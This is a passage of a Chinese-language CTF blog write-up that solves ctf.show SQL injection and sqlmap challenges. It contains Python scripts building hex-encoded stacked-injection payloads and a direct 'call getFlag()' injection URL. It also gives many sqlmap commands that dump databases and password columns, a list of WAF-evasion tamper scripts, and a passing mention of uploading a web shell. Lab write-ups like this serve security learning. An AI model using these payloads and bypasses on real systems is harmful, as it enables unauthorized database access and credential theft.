class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<p>看226，他比我们225多禁了 show 和（ ， 既然如此，我们的concat 和 char 也不能用了（因为在使用时需要括号嘛）</p>
<p>既然如此，我们可以继续使用预处理即可（为啥不用handler？因为我们拿到表名才行，handler不能，show和小括号被ban了）</p>
<p>预处理关键字使用16进制绕过就行，注意在16进制前面加上0x，不然系统不知道咋解析</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.sojson.com/hexadecimal.html" >16进制转换在线  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>当然自己写脚本转换16进制也行，手注可以用上面那个网站转换一下</p>
<h3 id="解法-–-预处理"><a href="#解法-–-预处理" class="headerlink" title="解法 – 预处理"></a>解法 – 预处理</h3><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><p>还是自己写了一个简单脚本</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://447de7ae-8c54-4cd2-a268-4b591f577cd7.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_maker</span>(<span class="params">sql : <span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Cirno&#x27;;prepare koishi from 0x<span class="subst">&#123;sql.encode().<span class="built_in">hex</span>()&#125;</span>;execute koishi;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:payload_maker(<span class="string">&quot;select * from ctfsh_ow_flagas&quot;</span>)</span><br><span class="line">        <span class="comment"># show tables</span></span><br><span class="line">        <span class="comment"># select * from ctfsh_ow_flagas</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url=url,params=params)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825210418038.png"
                      alt="image-20220825210418038"
                ></p>
<p><strong>over</strong></p>
<h2 id="227（堆叠-MySQL存储过程和函数）"><a href="#227（堆叠-MySQL存储过程和函数）" class="headerlink" title="227（堆叠-MySQL存储过程和函数）"></a>227（堆叠-MySQL存储过程和函数）</h2><p>看看题</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>看限制好像没啥区别，变化不痛不痒，之前的预处理还是可以用，但是居然不在数据库中，上传shell（可以用sqlmap，或者那个预处理脚本16进制绕过限制，用file into上传shell），依旧找不到flag。题目也没有任何提示，淦！看其他师傅的题解，原来是我又有知识盲点了</p>
<h3 id="学习知识点"><a href="#学习知识点" class="headerlink" title="学习知识点"></a>学习知识点</h3><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079" >(37条消息) MySQL——查看存储过程和函数_时光·漫步zth的博客-CSDN博客_mysql 查看存储函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<h2 id="查看存储过程和函数的信息"><a href="#查看存储过程和函数的信息" class="headerlink" title="查看存储过程和函数的信息"></a>查看存储过程和函数的信息</h2><p> 在  MySQL 中，存储过程和函数的信息存储在  information_schema  数据库下的  Routines  表中，可以通过查询该表的记录来查询存储过程和函数的信息，其基本的语法形式如下:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>   <span class="operator">*</span>   <span class="keyword">FROM</span>   information_schema.Routines <span class="keyword">WHERE</span>   ROUTINE_NAME  <span class="operator">=</span>  <span class="string">&#x27;   sp_name  &#x27;</span> ;</span><br></pre></td></tr></table></figure></div>

<p>其中，ROUTINE_NAME  字段中存储的是存储过程和函数的名称;   sp_name  参数表示存储过程或函数的名称。</p>
</blockquote>
<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.routines;</span><br></pre></td></tr></table></figure></div>

<p>因为还是有过滤，所以我们还是接着使用226的脚本</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://baf02cec-8845-40f5-94e8-e6680a19a03e.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_maker</span>(<span class="params">sql : <span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Cirno&#x27;;prepare koishi from 0x<span class="subst">&#123;sql.encode().<span class="built_in">hex</span>()&#125;</span>;execute koishi;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:payload_maker(<span class="string">&quot;call getFlag()&quot;</span>)</span><br><span class="line">        <span class="comment"># select * from information_schema.routines</span></span><br><span class="line">        <span class="comment"># call getFlag();</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url=url,params=params)</span><br><span class="line">    <span class="comment"># 导入textwrap模块将字符串换行输出，不然看起来太难受了，网页手注好像是有自动换行的，这波我属于是自己给自己找麻烦了 QAQ</span></span><br><span class="line">    <span class="built_in">print</span>(textwrap.fill(response.text, <span class="number">150</span>))</span><br></pre></td></tr></table></figure></div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825213515610.png"
                      alt="image-20220825213515610"
                ></p>
<p>这里可以看见 getFlag这个自定义的函数，而且他居然连flag都给了，淦</p>
<p><strong>如果其他时候没有写的这么明显，可以使用call函数来调用函数，上面脚本也有写</strong>（但是使用的预处理16进制的方式，由于没过滤call，我们可以简简单单的朴素的进行一手堆叠注入就行）</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=koishi&#x27;;call getFlag();</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825214137210.png"
                      alt="image-20220825214137210"
                ></p>
<h1 id="sqlmap使用系统学习"><a href="#sqlmap使用系统学习" class="headerlink" title="sqlmap使用系统学习"></a>sqlmap使用系统学习</h1><h2 id="201-206（没啥自己动手的地方）"><a href="#201-206（没啥自己动手的地方）" class="headerlink" title="201-206（没啥自己动手的地方）"></a>201-206（没啥自己动手的地方）</h2><h3 id="agent、referer"><a href="#agent、referer" class="headerlink" title="(agent、referer)"></a>(agent、referer)</h3><p><strong>题目提示</strong></p>
<blockquote>
<p> 使用–user-agent 指定agent</p>
<p> 使用–referer 绕过referer检查</p>
</blockquote>
<p><strong>例如：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?id=1 --user-agent sqlmap --referer ctf.show</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测注入类型(实际使用中感觉这步可以省略，下面那条语句在如果没有执行这个语句的条件下，也会执行这个，先执行这个后面的执行倒是会快一点的)</span></span><br><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --user-agent sqlmap --referer ctf.show</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出库名</span></span><br><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --user-agent sqlmap --referer ctf.show -dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出表名</span></span><br><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --user-agent sqlmap --referer ctf.show -D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出数据</span></span><br><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --user-agent sqlmap --referer ctf.show -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> --dump</span><br></pre></td></tr></table></figure></div>



<h3 id="post-方式提交数据"><a href="#post-方式提交数据" class="headerlink" title="post 方式提交数据"></a>post 方式提交数据</h3><p><strong>使用post方式进行注入，可以直接用<code>--data=&quot;id=1&quot;</code>，也可以<code>--method=post</code>来触发</strong></p>
<p>(有些时候url带上双引号不会出问题，有些时候又会出问题，奇奇怪怪，要是提示host not find 就把双引号删吧删吧)</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一步用--data调整参数</span><br><span class="line">python sqlmap.py -u http://69c5a44d-b5e5-47b2-a8dd-a87006ae618d.challenge.ctf.show/api/ --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span></span><br><span class="line">第二步</span><br><span class="line">python sqlmap.py -u http://69c5a44d-b5e5-47b2-a8dd-a87006ae618d.challenge.ctf.show/api/ --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --dbs</span><br><span class="line">第三步</span><br><span class="line">python sqlmap.py -u http://69c5a44d-b5e5-47b2-a8dd-a87006ae618d.challenge.ctf.show/api/ --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br><span class="line">第四步 (--dump是列字段值，也可以单独带上列名，重新写一句，使用列名参数前的字符是： -C )</span><br><span class="line">python sqlmap.py -u http://69c5a44d-b5e5-47b2-a8dd-a87006ae618d.challenge.ctf.show/api/ --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> --columns --dump</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="put-请求方式"><a href="#put-请求方式" class="headerlink" title="put 请求方式"></a>put 请求方式</h3><p><strong>–method 指定 put 请求方式，url 要带 index.php(这个应该是这个题的限制)，<font color=red>还要加上 –headers&#x3D;”Content-Type: text&#x2F;plain” 便于 put 接收表单参数，一定要加上–headers&#x3D;“Content-Type: text&#x2F;plain” ，否则是按表单提交的，put接收不到</font></strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://6837fe82-c4cc-40ec-<span class="number">9804</span>-27f49ab108e4.challenge.ctf.show:<span class="number">8080</span>/api/index.php --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://6837fe82-c4cc-40ec-<span class="number">9804</span>-27f49ab108e4.challenge.ctf.show:<span class="number">8080</span>/api/index.php --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> -D ctfshow_web --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://6837fe82-c4cc-40ec-<span class="number">9804</span>-27f49ab108e4.challenge.ctf.show:<span class="number">8080</span>/api/index.php --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> -D ctfshow_web -T ctfshow_user --columns</span><br><span class="line"></span><br><span class="line">（这里就是上一题说到的单独写一句。但是明明可以一下写完，何必呢）</span><br><span class="line">python sqlmap.py -u http://6837fe82-c4cc-40ec-<span class="number">9804</span>-27f49ab108e4.challenge.ctf.show:<span class="number">8080</span>/api/index.php --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> -D ctfshow_web -T ctfshow_user -C <span class="keyword">pass</span> --dump</span><br></pre></td></tr></table></figure></div>



<h3 id="cookie"><a href="#cookie" class="headerlink" title="__cookie"></a>__cookie</h3><p><strong>使用–cookie 带上 PHPSESSID（F12），其余不变。</strong></p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220820170331410.png"
                      alt="image-20220820170331410"
                ></p>
<hr>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测注入类型（实际执行过可以正常执行）</span></span><br><span class="line">python sqlmap.py -u http://80489c9e-aacb-4f78-b399-c43b9dfb4f3d.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=72enlin9c8r1o7ffnq16sd3a52; ctfshow=a5ee758751b072ac4b2ec52827ba7c50&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line">剩下的自己搭配就行了=。=</span><br><span class="line">还有就是切记不要刷新页面（我在做题的时候怕容器被关了，时不时刷新看看，结果前几次sqlmap都没成功，因为刷新之后会改变cookie，粗心大意给忘了）</span><br></pre></td></tr></table></figure></div>



<h3 id="权限"><a href="#权限" class="headerlink" title="_权限"></a>_权限</h3><p><strong>（好像还是put方法，其他方法我没试过（好像有type&#x3D;text就是put？），主要是sqlmap还是有点点慢）</strong></p>
<p>每次在进行查询之前都会先访问一次 url&#x2F;api&#x2F;getToken.php，否则会返回 api 鉴权失败。</p>
<p><strong>先看题提示</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220820172654426.png"
                      alt="image-20220820172654426"
                ></p>
<p><strong>通过抓包分析，在每次请求<code>url/api/index.php</code>之前需要先请求<code>URL/api/getTokn.php</code>，可以用burpsuite抓包看看确实是这么回事</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70.png"
                      alt="img"
                ></p>
<p><strong>–safe-url 设置在测试目标地址前访问的安全链接–safe-freq 设置两次注入测试前访问安全链接的次数</strong></p>
<p><strong>（或者查看日志发现 &#x2F;api&#x2F;getToken.php 的访问）</strong></p>
<p><strong>所以我们需要两个参数</strong></p>
<p>设置参数 –safe-url 和 –safe-freq 在调用 api 前访问 token 链接。</p>
<p>–safe-url 设置在测试目标地址前访问的安全链接<br>–safe-freq 设置两次注入测试前访问安全链接的次数</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://43ba86e5-c013-<span class="number">4491</span>-84bc-7de872c19b94.challenge.ctf.show/api/index.php --referer=ctf.show --cookie=<span class="string">&quot;PHPSESSID=umd7ocdluu007vvfk4t37e03pe;&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --method=PUT --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=http://43ba86e5-c013-<span class="number">4491</span>-84bc-7de872c19b94.challenge.ctf.show/api/getToken.php --safe-freq=<span class="number">1</span></span><br><span class="line"><span class="comment">#（最好把cookie也带上，我开始用没有cookie的语句，sqlmap提醒我没有给出cookie，他帮我自动获取了=。=）</span></span><br><span class="line"> </span><br><span class="line">后面的也不多写了，自己换就ok</span><br></pre></td></tr></table></figure></div>



<h3 id="闭合"><a href="#闭合" class="headerlink" title="_闭合"></a>_闭合</h3><p>sqlmap会帮我们自动闭合的，不用管。CTFer勇敢飞，sqlmap永相随 ：）</p>
<h2 id="207-213（需要自己写tamper）"><a href="#207-213（需要自己写tamper）" class="headerlink" title="207-213（需要自己写tamper）"></a>207-213（需要自己写tamper）</h2><h3 id="tamper绕过空格"><a href="#tamper绕过空格" class="headerlink" title="tamper绕过空格"></a>tamper绕过空格</h3><p><strong>题目提示要用 –tamper 加载自己写的 tamper</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = (&#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27;) limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看代码是过滤了空格</p>
<h4 id="1-使用自带的tamper"><a href="#1-使用自带的tamper" class="headerlink" title="1.使用自带的tamper"></a>1.使用自带的tamper</h4><p>我们看看自带的和空格有关的tamper，发现有很多，这里使用 sapce2comment 绕过。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220820181216652.png"
                      alt="0"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://bc2af829-2f3c-4060-b63c-101630fdfe14.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://bc2af829-2f3c-4060-b63c-101630fdfe14.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment</span><br></pre></td></tr></table></figure></div>

<p><strong>常用的tamper有：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py 用utf8代替引号 </span><br><span class="line">equaltolike.py MSSQL * SQLite中like 代替等号 </span><br><span class="line">greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号 </span><br><span class="line">space2hash.py 空格替换为#号 随机字符串 以及换行符 </span><br><span class="line">space2comment.py 用/**/代替空格 </span><br><span class="line">apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号 halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论 </span><br><span class="line">space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符 </span><br><span class="line">appendnullbyte.py Microsoft Access在有效负荷结束位置加载零字节字符编码 </span><br><span class="line">ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤 </span><br><span class="line">space2mssqlblank.py mssql空格替换为其它空符号 base64encode.py 用base64编码 </span><br><span class="line">space2mssqlhash.py mssql查询中替换空格 </span><br><span class="line">modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释 </span><br><span class="line">space2mysqlblank.py mysql中空格替换其它空白符号 </span><br><span class="line">between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）</span><br><span class="line">space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’） </span><br><span class="line">multiplespaces.py 围绕SQL关键字添加多个空格 </span><br><span class="line">space2plus.py 用+替换空格 </span><br><span class="line">bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like </span><br><span class="line">nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代 </span><br><span class="line">space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集 </span><br><span class="line">sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾 </span><br><span class="line">chardoubleencode.py 双url编码(不处理以编码的) </span><br><span class="line">unionalltounion.py 替换UNION ALL SELECT UNION SELECT </span><br><span class="line">charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码； </span><br><span class="line">randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写</span><br><span class="line">unmagicquotes.py 宽字符绕过 GPC addslashes</span><br><span class="line">randomcomments.py 用/**/分割sql关键字 </span><br><span class="line">charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码 </span><br><span class="line">securesphere.py 追加特制的字符串 </span><br><span class="line">versionedmorekeywords.py MySQL &gt;= 5.1.13注释绕过 </span><br><span class="line">halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释</span><br></pre></td></tr></table></figure></div>







<h4 id="2-自己写一个tamper"><a href="#2-自己写一个tamper" class="headerlink" title="2.自己写一个tamper"></a>2.自己写一个tamper</h4><p><a class="link"   target="_blank" rel="noopener" href="https://y4er.com/posts/sqlmap-tamper/" >Sqlmap Tamper 编写 - Y4er的博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>基本tamper格式</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW <span class="comment"># 当前脚本调用优先等级</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>(): <span class="comment"># 声明当前脚本适用/不适用的范围，可以为空。</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>): <span class="comment"># 用于篡改Payload、以及请求头的主要函数</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>编写好之后放在tamper文件夹里面即可（假设我们写的脚本名为my.py），使用时用参数 <code>--tamper=my</code></strong></p>
<h3 id="tamper绕过等号"><a href="#tamper绕过等号" class="headerlink" title="tamper绕过等号"></a>tamper绕过等号</h3><p><strong>题目过滤</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//TODO 未完工</span></span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\=/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>自己写的tamper（写的比较简单&#x3D;。&#x3D; ）</strong></p>
